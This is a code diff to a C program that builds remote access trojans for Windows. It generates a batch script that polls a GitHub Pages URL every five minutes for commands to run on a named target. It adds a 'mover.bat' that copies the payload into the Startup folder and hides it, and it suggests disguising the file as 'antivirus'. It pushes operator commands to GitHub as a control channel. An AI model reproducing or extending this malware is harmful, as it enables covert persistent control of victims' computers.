@@ -2,9 +2,25 @@
 #include <stdlib.h>
 #include <string.h>
 
+// CONFIG
+
+char github_repo[100] = "Operation_Strings/";
+char github_link[30] = "samjoel2007.github.io/";
+char target_dir[50];
+
 void generate_rat(char Target[] , char file_name[]) {
+	strcpy(target_dir, Target);
+	strcat(github_link, github_repo);
 	printf("Target = %s", Target);
 	printf("\nCreating File: %s", file_name);
+	char c[100];
+	strcpy(c, Target);
+	char format[10] = ".txt";
+	strcat(c, format);
+	// C -> TARGET
+	char filef[100];
+	strcpy(filef, c);
+	
 	char t[100];
 	char sl[100] = "/";
 	char f[100];
@@ -20,15 +36,14 @@ void generate_rat(char Target[] , char file_name[]) {
 	printf("\n%s",t);
 	
 	// LINKS
-	char target_link[100];
-	scanf("
+	strcat(github_link, c);
+	printf("\n%s", github_link);
 	
-	printf("
 	
 	FILE *fptr;
 	fptr = fopen(t, "w");
 
-fprintf(fp,
+fprintf(fptr,
     "@echo off\n"
     "setlocal enabledelayedexpansion\n\n"
 
@@ -41,16 +56,62 @@ fprintf(fp,
 
     "timeout /t 300 /nobreak >nul\n"
     "goto loop\n",
-    link2
+    github_link
 );
 
 	fclose(fptr);
-	printf("RAT SCRIPT HAS BEEN CREATED SUCCESSFULLY");
+	printf("\nRAT SCRIPT HAS BEEN CREATED SUCCESSFULLY");
+	//printf("\n GENERATING mover.bat FILE PLEASE WAIT...");
 	
 }
 
+void generate_mover_file(char target[]) {
+	char file[20] = "/mover.bat";
+	printf("\nCreating mover file for %s", target);
+	strcat(target, file);
+	FILE *fptr;
+	fptr = fopen(target, "w");
+
+	fprintf(fptr,
+    "@echo off\n"
+    "set \"source=%%~dp0%s\"\n"
+    "set \"startup=%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n"
+    "move \"%%source%%\" \"%%startup%%\\\"\n"
+    "attrib +h \"%%startup%%\\%s\"\n"
+    "pause\n",
+    target,
+    target
+	);
+	fclose(fptr);
+}
+
+void set_command(char target[]) {
+	char command[200];
+	char format[10] = ".txt";
+	char temp_target[100];
+	strcpy(temp_target, target);
+	strcat(target, format);
+	// PATH
+	char sl[10] = "/";
+	strcat(temp_target, sl);
+	strcat(temp_target, target);
+	// END OF PATH STR OPS
+	printf("\nEnter the CMD command: ");
+	scanf(" %[^\n]", command);
+	FILE *fp;
+	fp = fopen(temp_target, "w");
+	fprintf(fp, "%s", command);
+	fclose(fp);
+}
+
 void control_panel() {
-	
+	printf("Working on it!");
+}
+
+void save_changes() {
+	system("git add .");
+	system("git commit -m 'Made some changes ig'");
+	system("git push");
 }
 
 void view_rats() {
@@ -64,6 +125,8 @@ int main() {
 	char file_format[10] = ".bat";
 	int run = 1;
 	int action;
+	char f[100];
+	char temp_target[100];
 	
 	printf("\n(1) CREATE NEW RAT");
 	printf("\n(2) VIEW ALL RATS");
@@ -76,11 +139,16 @@ int main() {
 		if (action == 1) {
 			printf("\nEnter target name: ");
 			scanf("%s",target_name);
+			strcpy(temp_target, target_name);
 			printf("\nEnter file name (eg: antivirus) : ");
 			scanf("%s", file);
 			strcat(file, file_format);
 			//printf("\n%s", file);
-			generate_rat(target_name, file);
+			generate_rat(target_name, file);  // generates the main rat file
+			generate_mover_file(target_name); // generates the mover file. Moves rat file to Startup ;D
+			set_command(temp_target); // Set the command to be executed on target's system
+			// PUSH TO GITHUB
+			save_changes(); // Push the changes to github
 		} else if (action == 2) {
 			view_rats();
 		} else if (action == 0) {
